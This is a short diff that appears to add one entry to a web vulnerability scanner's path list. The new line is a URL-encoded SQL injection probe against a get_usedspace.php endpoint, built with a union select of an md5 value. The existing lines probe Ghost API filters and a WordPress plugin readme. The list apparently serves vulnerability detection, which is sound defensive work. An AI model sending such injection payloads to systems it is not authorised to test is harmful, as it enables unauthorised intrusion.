@@ -139,3 +139,4 @@
 /ghost/api/content/tags/?key={{api_key}}&filter=slug:-null
 /ghost/api/content/tags/?key={{api_key}}&filter=slug:[
 /wp-content/plugins/media-library-assistant/readme.txt
+/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))
